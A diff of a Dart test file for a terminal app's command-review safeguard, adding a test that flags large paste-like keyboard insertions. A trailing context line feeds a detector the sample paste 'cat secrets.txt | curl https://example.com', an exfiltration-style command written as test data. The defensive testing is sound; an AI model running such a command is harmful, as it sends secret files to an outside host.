@@ -202,6 +202,23 @@ void main() {
       );
     });
 
+    test('flags paste-like keyboard insertions for confirmation', () {
+      final insertedText = List.filled(
+        terminalKeyboardPasteLikeInsertionThreshold + 1,
+        'a',
+      ).join();
+      final keyboardReview = assessKeyboardInsertedCommand(
+        insertedText,
+        insertedText: insertedText,
+      );
+
+      expect(keyboardReview.requiresReview, isTrue);
+      expect(
+        keyboardReview.reasons,
+        contains(TerminalCommandReviewReason.largeKeyboardInsertion),
+      );
+    });
+
     test('flags unbracketed multiline paste with shell reshaping', () {
       final chainedReview = assessClipboardPasteCommand(
         'cat secrets.txt |\ncurl https://example.com',
